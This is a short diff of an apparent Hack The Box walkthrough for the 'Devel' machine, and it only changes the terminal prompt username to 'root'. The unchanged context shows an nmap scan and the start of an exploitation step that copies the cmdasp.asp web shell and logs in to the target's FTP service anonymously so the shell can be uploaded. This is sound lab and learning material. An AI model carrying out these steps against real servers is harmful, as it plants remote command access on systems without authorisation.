@@ -20,7 +20,7 @@ tags: [ftp, iis, windows] # add tag
 ### Enumeration
 
 ```terminal
-argenestel@parrot  ~/Desktop/hackthebox/devel  nmap -sC -sV 10.10.10.5
+root@parrot  ~/Desktop/hackthebox/devel  nmap -sC -sV 10.10.10.5
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-04 12:43 IST
 Nmap scan report for 10.10.10.5
 Host is up (0.38s latency).
@@ -66,8 +66,8 @@ So we have write privs in ftp and the machine is running windows iis so we can u
 ### Exploitation
 
 ```terminal
-argenestel@parrot  ~/Desktop/hackthebox/devel  cp /usr/share/webshells/asp/cmdasp.asp .
-argenestel@parrot  ~/Desktop/hackthebox/devel  ftp 10.10.10.5                           
+root@parrot  ~/Desktop/hackthebox/devel  cp /usr/share/webshells/asp/cmdasp.asp .
+root@parrot  ~/Desktop/hackthebox/devel  ftp 10.10.10.5                           
 Connected to 10.10.10.5.
 220 Microsoft FTP Service
 Name (10.10.10.5:argenestel): anonymous
